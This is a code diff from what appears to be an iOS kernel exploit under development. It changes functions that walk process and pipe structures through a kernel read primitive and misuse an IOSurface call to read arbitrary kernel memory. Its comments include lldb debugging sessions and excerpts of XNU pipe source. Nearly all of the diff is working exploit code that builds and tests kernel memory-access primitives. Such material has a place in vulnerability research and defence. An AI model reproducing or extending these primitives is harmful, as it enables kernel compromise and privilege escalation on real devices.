@@ -23,26 +23,41 @@ void read_pipe()
 	// read - bsd/kern/sys_generic.c:201
 	// fo_read - bsd/kern/kern_descrip.c:5572
 	// pipe_read - bsd/kern/sys_pipe.c:740
+
+    // printf("pipe_buffer 1 = %s\n", pipe_buffer);
     size_t read_size = pipe_buffer_size - 1;
     read(pipefds[0], pipe_buffer, read_size);
-    // printf("pipe_buffer = %s\n", pipe_buffer)
+    // printf("pipe_buffer 2 = %s\n", pipe_buffer);
 }
 
 void write_pipe()
 {
     // pipe_write - bsd/kern/sys_pipe.c:901
+    // printf("write_pipe buf = %s\n", pipe_buffer);
     size_t write_size = pipe_buffer_size - 1;
-    write(pipefds[1], pipe_buffer, write_size);
+    int write_ret = write(pipefds[1], pipe_buffer, write_size);
+    printf("write_ret = %d\n", write_ret);
 }
 
 uint64_t surfaceClients = 0;
+uint64_t rpipe = 0;
+uint64_t wpipe = 0;
 void build_stable_kmem_api()
 {
-    uint64_t p_fd = kread64(proc_of_pid(getpid()) + off_p_pfd); //kapi_read_kptr(proc_of_pid(getpid()) + OFFSET(proc, p_fd));
-    uint64_t fd_ofiles = kread64(p_fd); //kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
-    uint64_t rpipe_fp = kread64(fd_ofiles + pipefds[0] * 8); //kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
-    uint64_t fp_glob = kread64(rpipe_fp + off_fp_fglob); //kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
-    uint64_t rpipe = kread64(fp_glob + off_fg_data); //kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
+    uint64_t p_fd = kread64(proc_of_pid(getpid()) + off_p_pfd); 
+    uint64_t fd_ofiles = kread64(p_fd); 
+    uint64_t rpipe_fp = kread64(fd_ofiles + pipefds[0] * 8);
+    uint64_t r_fp_glob = kread64(rpipe_fp + off_fp_fglob);
+    rpipe = kread64(r_fp_glob + off_fg_data); 
+    uint64_t wpipe_fp = kread64(fd_ofiles + pipefds[1] * 8);
+    uint64_t w_fp_glob = kread64(wpipe_fp + off_fp_fglob);
+    wpipe = kread64(w_fp_glob + off_fg_data); 
+    printf("rpipe = 0x%llx, wpipe = 0x%llx\n", rpipe, wpipe);
+    
+    uint32_t rpipe_cnt = kread32(rpipe + off_pb_cnt);
+    uint32_t wpipe_cnt = kread32(wpipe + off_pb_cnt);
+    printf("rpipe_cnt = 0x%x, wpipe_cnt = 0x%x\n", rpipe_cnt, wpipe_cnt);
+
     pipe_base = kread64(rpipe + off_pb_buffer); //kapi_read_kptr(rpipe + OFFSET(pipe, buffer));
     printf("pipe_base = 0x%llx\n", pipe_base);
 
@@ -156,7 +171,7 @@ uint32_t kpri_read32(uint64_t where) {
     //       w0 = 0xfeedfacf
     p->surf_obj = where - 0xb4;
     printf("p ptr = %p\n", p);  //p's ptr will be used by copyin's user_addr
-    printf("Going to call write_pipe, set breakpoint first and press any key.\n"); char ch; ch = getchar();
+    // printf("Going to call write_pipe, set breakpoint first and press any key.\n"); char ch; ch = getchar();
 
     //  p->uc_obj, p->surf_obj will updated by uiomove in pipe_write - bsd/kern/sys_pipe.c:1046
     // uio_move - bsd/kern/kern_subr.c:114
@@ -221,9 +236,6 @@ uint32_t kpri_read32(uint64_t where) {
             x1 = 0xffffffe4cdb43000 <- pipe_base
             x2 = 0x0000000000000fff <- nbytes
 */
-
-
-
     write_pipe();
 
     //call stack:
@@ -256,10 +268,70 @@ uint32_t kpri_read32(uint64_t where) {
     //__TEXT_EXEC:__text:FFFFFFF0080AD5D4                         ; __int64 __fastcall fleh_synchronous(__int64)
     //__TEXT_EXEC:__text:FFFFFFF0080AD5F8 8D 26 EB 97                             BL              _sleh_synchronous
 
-    printf("Going to call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n"); ch = getchar();
+    printf("Going to call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n"); char ch = getchar();
     
     uint32_t v = iosurface_s_get_ycbcrmatrix();
-    read_pipe();
+
+    //if we don't call read_pipe later, then pipe_base 0xffffffe4cdb43000 will be remained like below..?
+    // Process 1 stopped
+    // * thread #3, stop reason = instruction step into
+    //     frame #0: 0xfffffff015254154
+    // ->  0xfffffff015254154: ldr    x0, [x8, w22, uxtw #3]
+        // 0xfffffff015254158: cbz    x0, 0xfffffff015254168
+        // 0xfffffff01525415c: mov    x1, x21
+        // 0xfffffff015254160: bl     0xfffffff01524e500
+    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
+    // (lldb) reg read x8
+        //   x8 = 0xffffffe4cdb43000
+    // (lldb) x/16gx 0xffffffe4cdb43000
+    // 0xffffffe4cdb43000: 0x3f00113a0a15025c 0x0000000000000000
+    // 0xffffffe4cdb43010: 0x0000000000000000 0x0000000000000000
+    // ... weird!
+
+    //
+
+    // Cause why we need to called read_pipe:
+    // bsd/kern/sys_pipe.c:957 from pipe_write
+#if 0
+/*
+		 * need to do initial allocation or resizing of pipe
+		 * holding both structure and io locks.
+		 */
+		if ((error = pipeio_lock(wpipe, 1)) == 0) {
+			if (wpipe->pipe_buffer.cnt == 0) { <- YYY this checks
+				error = pipespace(wpipe, pipe_size); 
+			} else {
+				error = expand_pipespace(wpipe, pipe_size); <- if not wpipe->pipe_buffer.cnt == 0, then expand allocation
+			}
+
+			pipeio_unlock(wpipe);
+
+			/* allocation failed */
+			if (wpipe->pipe_buffer.buffer == 0) {
+				error = ENOMEM;
+			}
+		}
+
+/*
+ * expand the size of pipe while there is data to be read,
+ * and then free the old buffer once the current buffered
+ * data has been transferred to new storage.
+ * Required: PIPE_LOCK and io lock to be held by caller.
+ * returns 0 on success or no expansion possible
+ */
+static int
+expand_pipespace(struct pipe *p, int target_size)
+...
+#endif 
+    // if ever had called pipe_read from read_pipe, then cnt will be decreased, so no need to expand allocation
+    // rpipe->pipe_buffer.cnt -= size; ( bsd/kern/sys_pipe.c:796 from pipe_read )
+    // read_pipe();
+
+    printf("Going to end of call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n");  ch = getchar();
+    uint32_t rpipe_cnt = kread32(rpipe + off_pb_cnt);
+    uint32_t wpipe_cnt = kread32(wpipe + off_pb_cnt);
+    printf("[kpri_kread32] rpipe_cnt = 0x%x, wpipe_cnt = 0x%x\n", rpipe_cnt, wpipe_cnt);
+
     return v;
 };
 
